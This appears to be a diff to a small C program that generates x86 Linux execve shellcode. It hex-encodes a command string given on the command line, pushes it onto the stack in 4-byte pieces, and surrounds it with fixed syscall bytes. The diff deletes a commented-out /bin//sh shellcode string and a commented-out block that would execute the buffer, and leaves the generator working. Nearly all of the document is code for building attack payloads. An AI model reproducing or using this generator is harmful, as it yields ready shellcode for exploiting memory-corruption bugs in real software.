@@ -6,7 +6,6 @@ char ascii[100], new_ascii[100];
 char my_code[1024];
 char *shellcode1 = "\\x31\\xc0\\x50";
 char *shellcode2 = "\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\xb0\\x01\\x31\\xdb\\xcd\\x80";
-//char *bash_shell = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80";
 
 char hexDigit(unsigned n)
 {
@@ -32,7 +31,7 @@ void getHex(char *ascii, char output[1024])
 	for(i=0; i<strlen(ascii); i++) {
 		charToHex(ascii[i], hex);
 		strcat(output, "\\x");
-		strcat(output, hex);		
+		strcat(output, hex);
 	}
 }
 
@@ -55,7 +54,6 @@ void convert(char *ascii, char new_ascii[100])
 char* main(int argc, char * argv[])
 {
 	char output[1024], code[1024];
-	
 	int i,j;
 	if(argc < 2){
 		printf("No arguments passed\n");
@@ -63,8 +61,6 @@ char* main(int argc, char * argv[])
 	}
 	strcpy(ascii, argv[1]);
 	convert(ascii, new_ascii);
-//	printf("Initial shellcode : %s\n",ascii);
-//	printf("New Shellcode : %s\n",new_ascii);
 	strcat(my_code, shellcode1);
 	for(i=strlen(new_ascii)-4; i>=0; i-=4) {
 		for(j=0; j<4; j++) {
@@ -75,13 +71,7 @@ char* main(int argc, char * argv[])
 		getHex(code, output);
 		strcat(my_code, output);
 	}
-//    printf("%s\n\n",my_code);
-//    getHex(new_ascii, output);
-//    strcat(my_code, output);
 	strcat(my_code, shellcode2);
-	printf("%s\n",my_code);		
-/*	int (*shell)();
-  	shell = my_code;
-  	shell();
-*/	return my_code;
+	printf("%s\n",my_code);
+	return my_code;
 }
